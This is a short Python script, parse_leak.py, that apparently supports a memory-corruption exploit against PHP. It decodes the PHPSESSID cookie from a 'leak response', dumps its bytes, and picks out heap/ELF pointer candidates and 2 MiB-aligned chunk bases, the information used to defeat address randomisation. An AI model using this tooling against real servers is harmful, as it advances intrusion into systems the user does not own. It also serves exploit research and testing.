#!/usr/bin/env python3
"""parse_leak.py - decode the PHPSESSID cookie of a leak response and report
the bytes plus any heap/ELF pointers found.

Usage: parse_leak.py <response-file> [--raw-out <file>]
Prints:
  LEN=<decoded length>
  HEX=<first 128 bytes hex>
  PTR<n>=<value>  (8-byte aligned candidates in 0x7f0000000000..0x800000000000)
  CHUNK_CANDIDATE=<2 MiB aligned base>:<count>
"""
import sys
import urllib.parse
from collections import Counter


def cookies(raw):
    head, _, _ = raw.partition(b"\r\n\r\n")
    out = []
    for line in head.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:"):
            out.append(line.split(b":", 1)[1].strip())
    return out


def main():
    path = sys.argv[1]
    raw = open(path, "rb").read()
    vals = []
    for c in cookies(raw):
        name, _, rest = c.partition(b"=")
        val = rest.split(b";", 1)[0]
        dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
        vals.append((name.decode("latin1", "replace"), dec))
    if not vals:
        print("NO_COOKIE")
        return 2
    for name, dec in vals:
        print("COOKIE=%s LEN=%d" % (name, len(dec)))
        print("HEX=%s" % dec[:128].hex())
        ptrs = []
        for i in range(0, len(dec) - 7):
            q = int.from_bytes(dec[i:i + 8], "little")
            if 0x7F0000000000 <= q < 0x800000000000:
                ptrs.append((i, q))
        for i, q in ptrs[:40]:
            print("PTR%d=%#x" % (i, q))
        bases = Counter(q & ~0x1FFFFF for _, q in ptrs)
        for b, n in bases.most_common(8):
            print("CHUNK_CANDIDATE=%#x:%d" % (b, n))
        if "--raw-out" in sys.argv:
            out = sys.argv[sys.argv.index("--raw-out") + 1]
            open(out, "wb").write(dec)
            print("RAW_OUT=%s" % out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
